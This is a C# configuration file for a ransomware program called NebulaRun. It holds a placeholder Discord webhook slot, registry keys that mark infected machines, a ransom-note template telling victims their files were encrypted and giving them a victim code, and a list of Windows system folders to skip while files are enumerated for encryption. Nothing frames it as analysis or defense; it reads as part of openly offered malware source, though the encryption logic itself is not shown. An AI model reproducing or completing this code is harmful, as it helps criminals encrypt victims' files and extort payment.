using System;
using System.Collections.Generic;

namespace NebulaRun
{
	public static class Config
	{
		// Discord webhook
		public static string WebhookUrl = "YOUR-WEBHOOK-HERE";

		// Contact info shown in UI and notes
		public static string ContactInfo = "EXAMPLE";

		// Registry paths / values
		public const string RegKeyPath = @"Software\NebulaRun";
		public const string RegValueName = "Marked";
		public const string RegValueData = "1";
		public const string RegKeyHashesValue = "KeyHashes";

		// Ransom note template (victim code appended at runtime)
		public static readonly string NotePrefix =
			"ATTENTION!\n\nYour important files have been encrypted with military-grade XChaCha8 encryption.\n\n" +
			"To decrypt your files, run the Nebula Decryptor application and enter your 32-byte Base64 key.\n\n" +
			"Your Victim Code is: ";

		public static string GetNoteText(string victimCode)
		{
			return NotePrefix + victimCode;
		}

		// System folder keywords to skip during enumeration
		public static readonly string[] SystemFolderKeywords = new string[]
		{
			"\\system32",
			"\\syswow64",
			"\\syswow",
			"\\windows",
			"\\winsxs",
			"\\winsxs64",
			"microsoft",
			"windows"
		}; /* KEYWORDS TO IGNORE */
	}
}
